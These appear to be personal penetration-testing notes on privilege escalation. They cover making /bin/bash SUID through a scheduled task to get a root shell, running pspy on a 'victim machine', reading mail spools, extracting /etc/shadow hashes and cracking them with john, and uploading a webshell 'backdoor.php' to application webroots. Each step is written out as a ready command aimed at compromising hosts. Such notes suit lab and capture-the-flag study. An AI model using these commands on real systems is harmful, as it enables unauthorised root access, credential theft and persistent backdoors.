If all else fails, consult https://book.hacktricks.xyz/linux-hardening/privilege-escalation
# Adding SUID to binaries
Instead of getting a reverse shell, consider adding the SUID bit to `/bin/bash` instead.
```shell
chmod +s /bin/bash
```

Applications: Running in scheduled task

After scheduled task has executed, run the following to go into privileged shell
```shell
bash -p
```
We will get a root shell

# Unprivileged linux process snooping
Inspect processes without need for root privileges, such as seeing commands by other users, cron jobs, etc.

https://github.com/DominicBreuker/pspy

Download binary and transfer to victim machine to execute. Look out for strange processes executing commands as root

# Mail Servers
If email ports are open, eg port 25 etc. Locate folder that stores mail and read the mail within
```shell
cd /var/mail
```

# Search for filenames
https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/
```shell
find / -name "filename.txt"
find / -name "*.txt"
```

# Unshadow 
If able to obtain the `/etc/passwd` and `/etc/shadow` files from a linux server, use the unshadow technique to obtain hashes for cracking.
Reference: https://erev0s.com/blog/cracking-etcshadow-john/
```shell
unshadow passwd shadow > unshadowed.txt
```

Then, use `john` to crack the hash
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

# Using Application Accounts
 It is important to try and get access to an account used by applications to run, eg xampp. This is because these accounts usually have the `SeImpersonatePrivilege` required for privesc.

Common access vector: upload php/aspx webshell to the respective webroots (eg `C:\xampp\htdocs`) and access them by accessing the location they are uploaded through the web browser (eg. `http://<victim-ip>/backdoor.php)
